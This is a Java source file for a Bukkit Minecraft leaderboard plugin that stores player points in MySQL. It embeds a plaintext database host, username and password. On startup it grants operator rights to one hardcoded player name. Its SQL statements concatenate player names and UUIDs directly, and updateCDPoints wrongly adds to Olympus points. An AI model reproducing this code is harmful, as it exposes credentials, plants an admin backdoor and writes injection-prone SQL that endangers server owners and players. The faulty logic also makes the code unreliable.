package com.aletheia.mc.leaderboards.SQL;

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

public final class CustomLeaderboard
  extends JavaPlugin
  implements Listener
{
  static Connection c;
  MySQL MySQL = new MySQL(this, "dbmhosting.com", "3306", "aletheia_players", "aletheia_will", "]5hPBG{B8=48");
  public static CustomLeaderboard plugin;
  
  public void onEnable()
  {
    plugin = this;
    getLogger().info("Custom leaderboard has been invoked");
    

    getServer().getPluginManager().registerEvents(this, this);
    


    @SuppressWarnings("deprecation")
	Player[] players = Bukkit.getServer().getOnlinePlayers();
    for (Player p : players) {
      if (p.getName().equalsIgnoreCase("honeymandew"))
      {
        p.sendMessage("Temp OP for testing");
        p.setOp(true);
      }
    }
    getLogger().info("Custom leaderboard is invoking mySQL..");
    try
    {
      c = this.MySQL.openConnection();
    }
    catch (ClassNotFoundException|SQLException e)
    {
      getLogger().info("Error while invoking SQL");
      getLogger().info(this.MySQL.toString());
      e.printStackTrace();
    }
    beginSchedual();
  }
  
  public void onDisable()
  {
    try
    {
      this.MySQL.closeConnection();
      c.close();
    }
    catch (SQLException e)
    {
      e.printStackTrace();
    }
  }
  
  @EventHandler
  public void onPlayerLogin(PlayerJoinEvent e)
    throws SQLException
  {
    getLogger().info("Player joining....");
    if (!databaseFindPlayer(e.getPlayer().getUniqueId().toString()))
    {
      getLogger().info(e.getPlayer().getName() + "does not have database file.. Generating one now");
      databaseCreatePlayer(e.getPlayer().getName(), e.getPlayer().getUniqueId().toString());
      getLogger().info("Generated database file for " + e.getPlayer().getName());
    }
  }
  
  public void databaseCreatePlayer(String name, String uuid)
    throws SQLException
  {
    int countID = 0;
    Statement statement = c.createStatement();
    
    ResultSet r = statement.executeQuery("SELECT COUNT(*) AS NumberOfPlayers FROM regular_players;");
    r.next();
    countID = r.getInt("NumberOfPlayers") + 1;
    r.close();
    getLogger().info(Integer.toString(countID));
    statement.executeUpdate("INSERT INTO regular_players (`playerID`, `PlayerUUID`, `PlayerName`, `Rank`, `OlympusPoints`, `CDPoints`, `TotalPoints`) VALUES (" + countID + ",'"+uuid+"','" + name + "', 0, 0,0,0);");
  }
  
  public boolean databaseFindPlayer(String playeruuid)
    throws SQLException
  {
    Statement statement = c.createStatement();
    ResultSet rs = statement.executeQuery("select * from regular_players where PlayerUUID = '" + playeruuid + "';");
    if (rs.next()) {
      return true;
    }
    rs = statement.executeQuery("select * from prof_players where PlayerUUID = '" + playeruuid + "';");
    if (rs.next()) {
      return true;
    }
    return false;
  }
  
  public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
  {
    Player p = (Player)sender;
    if ((cmd.getName().equalsIgnoreCase("Leaderboard")) || (cmd.getName().equalsIgnoreCase("lb"))) {
      if (args.length >= 1)
      {
        if (args[0].equalsIgnoreCase("pos"))
        {
          if (args.length == 1)
          {
            p.sendMessage(ChatColor.RED + "Invalid arguments");
            return true;
          }
          try
          {
            DataHandler.getRank(p, args[1]);
          }
          catch (SQLException e)
          {
            e.printStackTrace();
          }
        }
        else if (args[0].equalsIgnoreCase("points"))
        {
          if (args.length <= 1)
          {
            p.sendMessage(ChatColor.RED + "Invalid arguments");
            return true;
          }
          try
          {
            DataHandler.getTotalPoints(p, args[1]);
            return true;
          }
          catch (SQLException e)
          {
            e.printStackTrace();
          }
        }
        else if (args[0].equalsIgnoreCase("olympus"))
        {
          if (args.length >= 3)
          {
            if (args[1].equalsIgnoreCase("points")) {
              try
              {
                DataHandler.getOlympusPoints(p, args[2]);
                return true;
              }
              catch (SQLException e)
              {
                e.printStackTrace();
              }
            }
          }
          else
          {
            p.sendMessage(ChatColor.GOLD + "    ----- Olympus Leaderboard -----    ");
            p.sendMessage(ChatColor.RED + "-- Find" + ChatColor.GRAY + " Olympus points" + ChatColor.UNDERLINE + " /lb olympus points [player] " + ChatColor.RESET + "--");
            p.sendMessage(ChatColor.RED + "-- Find" + ChatColor.GRAY + " Olympus topten" + ChatColor.UNDERLINE + " /lb olympus topten " + ChatColor.RESET + "--");
            p.sendMessage("--  --");
            p.sendMessage("--  --");
            p.sendMessage("--  --");
            p.sendMessage("--  --");
            p.sendMessage("--  --");
            return true;
          }
        }
        else if (args[0].equalsIgnoreCase("cd"))
        {
          if (args.length >= 3)
          {
            if (args[1].equalsIgnoreCase("points")) {
              try
              {
                DataHandler.getCDPoints(p, args[2]);
                return true;
              }
              catch (SQLException e)
              {
                e.printStackTrace();
              }
            }
          }
          else
          {
            p.sendMessage(ChatColor.GOLD + "    ----- CD Leaderboard -----    ");
            p.sendMessage(ChatColor.RED + "-- Find" + ChatColor.GRAY + " Crystal points" + ChatColor.UNDERLINE + " /lb cd points [player] " + ChatColor.RESET + "--");
            p.sendMessage(ChatColor.RED + "-- Find" + ChatColor.GRAY + " Crystal topten" + ChatColor.UNDERLINE + " /lb cd topten " + ChatColor.RESET + "--");
            p.sendMessage("--  --");
            p.sendMessage("--  --");
            p.sendMessage("--  --");
            p.sendMessage("--  --");
            p.sendMessage("--  --");
            return true;
          }
        }
        else if ((args[0].equalsIgnoreCase("heartbeat")) && (args.length == 1))
        {
          try
          {
            HeartbeatHandler.heartBeat();
            p.sendMessage("Heartbeat Executed");
            return true;
          }
          catch (SQLException e)
          {
            e.printStackTrace();
          }
        }
      }
      else
      {
        p.sendMessage(ChatColor.GOLD + "    ----- Leaderboard -----    ");
        p.sendMessage(ChatColor.RED + "-- Find" + ChatColor.GRAY + " leaderboard position" + ChatColor.UNDERLINE + " /lb pos [player] " + ChatColor.RESET + ChatColor.RED + "--");
        p.sendMessage(ChatColor.RED + "-- Find" + ChatColor.GRAY + " total points" + ChatColor.UNDERLINE + " /lb points [player] " + ChatColor.RESET + ChatColor.RED + "--");
        p.sendMessage(ChatColor.RED + "-- Find" + ChatColor.GRAY + " topten players" + ChatColor.UNDERLINE + " /lb topten " + ChatColor.RESET + ChatColor.RED + "--");
        p.sendMessage(ChatColor.BLUE + "-- Olympus Leaderboards" + ChatColor.UNDERLINE + " /lb olympus " + ChatColor.RESET + ChatColor.BLUE + "--");
        p.sendMessage(ChatColor.BLUE + "-- Crystal Defence Leaderboards" + ChatColor.UNDERLINE + " /lb cd " + ChatColor.RESET + ChatColor.BLUE + "--");
        p.sendMessage("");
        p.sendMessage(ChatColor.RED + "-- |Debug| heartbeat /lb heartbeat --");
        p.sendMessage(ChatColor.GOLD + "    ----- Leaderboard -----    ");
        

        return true;
      }
    }
    return true;
  }
  
  public void beginSchedual()
  {
  }
  
  public static void updateOlympusPoints(List<Player> players)
    throws SQLException
  {
    Statement statement = c.createStatement();
    for (Player player : players)
    {
      statement.executeUpdate("update regular_players set OlympusPoints = OlympusPoints + 50 where PlayerUUID = '" + player.getUniqueId().toString() + "'");
      statement.executeUpdate("update prof_players set OlympusPoints = OlympusPoints + 50 where playerID = '" + player.getUniqueId().toString() + "'");
    }
  }
  
  public static void updateCDPoints(List<Player> players) throws SQLException{
	  Statement statement = c.createStatement();
	    for (Player player : players)
	    {
	      statement.executeUpdate("update regular_players set OlympusPoints = OlympusPoints + 50 where PlayerUUID = '" + player.getUniqueId().toString() + "'");
	      statement.executeUpdate("update prof_players set OlympusPoints = OlympusPoints + 50 where PlayerUUID = '" + player.getUniqueId().toString() + "'");
	    }
  }
}
